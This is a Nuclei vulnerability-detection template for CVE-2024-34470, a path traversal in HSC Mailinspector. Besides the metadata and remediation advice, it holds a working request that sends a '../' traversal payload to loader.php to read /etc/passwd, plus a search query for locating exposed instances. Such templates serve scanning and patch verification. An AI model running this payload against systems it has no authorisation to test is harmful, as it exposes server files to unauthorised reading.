id: CVE-2024-34470

info:
  name: HSC Mailinspector 5.2.17-3 through 5.2.18 - Local File Inclusion
  author: topscoder
  severity: high
  description: |
    An Unauthenticated Path Traversal vulnerability exists in the /public/loaderphp file The path parameter does not properly filter whether the file and directory passed are part of the webroot, allowing an attacker to read arbitrary files on the server.
  impact: |
    Unauthenticated attackers can exploit path traversal to read arbitrary files from the server.
  remediation: |
    Update HSC Mailinspector to a version later than 5.2.18 that patches the path traversal vulnerability.
  reference:
    - https://github.com/osvaldotenorio/CVE-2024-34470
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/fkie-cad/nvd-json-data-feeds
    - https://nvd.nist.gov/vuln/detail/CVE-2024-34470
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-score: 0.92993
    epss-percentile: 0.9977
  metadata:
    verified: true
    max-request: 2
    fofa-query: "mailinspector/public"
  tags: cve,cve2024,lfi,mailinspector,hsc,vuln

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/mailinspector/login.php"

    host-redirects: true
    matchers:
      - type: word
        part: body
        words:
          - "Licensed to HSC TREINAMENTO"

  - method: GET
    path:
      - "{{BaseURL}}/mailinspector/public/loader.php?path=../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100e761d59e4e3487b49980c02cdb284eaa6dad6a73fafeeb377fa2e382602bc5b002203c9c20eb197b77f9c0c1b6b5c97a888e7b9d2aaba5ff33e1e0bdfa880f89d2dc:922c64590222798bb761d5b6d8e72950